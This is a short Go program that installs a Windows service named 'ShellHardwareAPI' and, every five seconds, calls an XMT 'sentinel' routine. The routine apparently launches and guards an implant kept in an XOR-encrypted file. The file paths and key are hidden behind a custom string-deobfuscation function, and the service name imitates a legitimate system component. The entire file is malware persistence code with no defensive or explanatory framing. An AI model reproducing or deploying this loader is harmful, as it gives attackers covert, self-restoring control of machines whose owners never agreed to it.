// +build windows

package main

import (
	"sync/atomic"
	"time"

	"github.com/iDigitalFlame/xmt/data/crypto"
	"github.com/iDigitalFlame/xmt/man"

	"golang.org/x/sys/windows/svc"
)

var (
	v0 = crypto.XOR(x(60, []byte{22, 40, 38, 21, 37, 32, 43, 15, 49, 39, 31, 44}))
	v1 = x(60, []byte{7, 253, 30, 39, 41, 43, 35, 235, 48, 51, 46})
	v2 = x(60, []byte{27, 44, 48, 37, 47, 54, 17, 34, 31, 11, 44, 40, 46, 248, 6, 254})
	v3 = x(60, []byte{44, 55, 54, 49, 250, 238, 237, 238, 243, 237, 232, 234, 238, 229, 231, 236, 230, 225, 227, 235, 232, 223, 230, 222, 219, 18, 216, 14, 32, 12})
)

const svcName = "ShellHardwareAPI"

type ping struct{}

func main() {
	svc.Run(svcName, ping{})
}
func x(v int, b []byte) string {
	for i := range b {
		b[i] += byte(i + v)
	}
	return string(b)
}
func (ping) Execute(_ []string, r <-chan svc.ChangeRequest, i chan<- svc.Status) (bool, uint32) {
	i <- svc.Status{State: svc.StartPending}
	var (
		t = time.NewTicker(time.Second * 5)
		d uint32
	)
	i <- svc.Status{State: svc.Running, Accepts: svc.AcceptStop | svc.AcceptShutdown}
	for atomic.LoadUint32(&d) == 0 {
		select {
		case <-t.C:
			man.SentinelFromXORFile(v1, v2, v3, v0)
		case q := <-r:
			switch q.Cmd {
			case svc.Interrogate:
				i <- q.CurrentStatus
				time.Sleep(100 * time.Millisecond)
				i <- q.CurrentStatus
			case svc.Stop, svc.Shutdown:
				atomic.StoreUint32(&d, 1)
			default:
			}
		}
	}
	t.Stop()
	i <- svc.Status{State: svc.StopPending}
	return false, 0
}
